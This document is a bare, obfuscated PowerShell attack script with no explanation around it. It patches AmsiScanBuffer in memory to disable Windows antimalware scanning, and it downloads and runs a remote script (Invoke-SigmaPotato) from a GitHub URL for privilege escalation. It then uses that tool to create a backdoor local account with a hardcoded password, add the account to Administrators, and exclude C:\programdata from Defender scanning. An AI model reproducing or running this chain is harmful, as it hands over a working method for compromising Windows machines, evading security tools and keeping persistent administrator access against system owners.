
$COvCvkXv3XRj = @"
using System;
using System.Runtime.InteropServices;
public class COvCvkXv3XRj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr AlC, string gUqnjEcXmlcZA);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr mxf3_Y3xoFIMo8UR8RnD, UIntPtr lelgDA6F, uint QJhkBPaYp, out uint DXokYTXBAzwwvypanr);
}
"@

Add-Type $COvCvkXv3XRj

$K7PU7qJLXq = [COvCvkXv3XRj]::LoadLibrary("$(('ámsî.'+'dll').NormaliZe([cHar](70*10/10)+[chAr](111+29-29)+[char]([BYTe]0x72)+[cHAr]([BYtE]0x6d)+[ChaR]([byTe]0x44)) -replace [CHAR]([BYTE]0x5c)+[cHAR](112*45/45)+[chAr](123)+[char](77*27/27)+[chAR]([BYTe]0x6e)+[CHAr](125*5/5))")
$EfO = [COvCvkXv3XRj]::GetProcAddress($K7PU7qJLXq, "$([cHar]([bYte]0x41)+[ChAR]([BytE]0x6d)+[char](79+36)+[char](105+71-71)+[CHAr](83+9-9)+[chAR]([byte]0x63)+[CHAR]([BYtE]0x61)+[cHAR](110)+[CHaR]([byte]0x42)+[chaR]([bYTE]0x75)+[cHAr](102)+[cHaR](7+95)+[CHar](44+57)+[chAR](91+23))")
$p = 0
[COvCvkXv3XRj]::VirtualProtect($EfO, [uint32]5, 0x40, [ref]$p)
$Y41O5u5ouyokZ = "0xB8"
$uHO42_tuJ1g = "0x57"
$zE9f6csqe9QmJD7eE = "0x00"
$hXeX9oLi1yxlQ = "0x07"
$eeOxzVWm = "0x80"
$fimHibN0nwWhX = "0xC3"
$L22 = [Byte[]] ($Y41O5u5ouyokZ,$uHO42_tuJ1g,$zE9f6csqe9QmJD7eE,$hXeX9oLi1yxlQ,+$eeOxzVWm,+$fimHibN0nwWhX)
[System.Runtime.InteropServices.Marshal]::Copy($L22, 0, $EfO, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"

